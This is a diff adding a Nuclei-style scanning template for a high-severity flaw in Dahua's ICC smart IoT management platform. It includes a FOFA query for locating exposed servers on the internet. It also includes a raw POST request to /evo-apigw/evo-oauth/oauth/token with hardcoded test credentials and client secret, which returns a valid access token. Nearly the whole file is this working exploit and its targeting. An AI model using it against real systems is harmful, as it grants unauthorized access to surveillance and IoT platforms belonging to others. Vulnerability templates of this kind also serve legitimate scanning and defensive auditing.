@@ -1,0 +1,27 @@
+id: dahua-icc-evo-oauth-token-disclosure
+info:
+  name: 大华 icc 智能物联综合管理平台 /evo-apigw/evo-oauth/oauth/token - 敏感信息泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-qeury: body="/static/fontshd/font-hd.css" || icon_hash="-1935899595" || body="*客户端会小于800*" 
+  tags: dahua,disclosure,icc
+
+http:
+  - raw:
+      - |+
+        POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 115
+
+        username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"access_token","token_type","expires_in") && status_code == 200
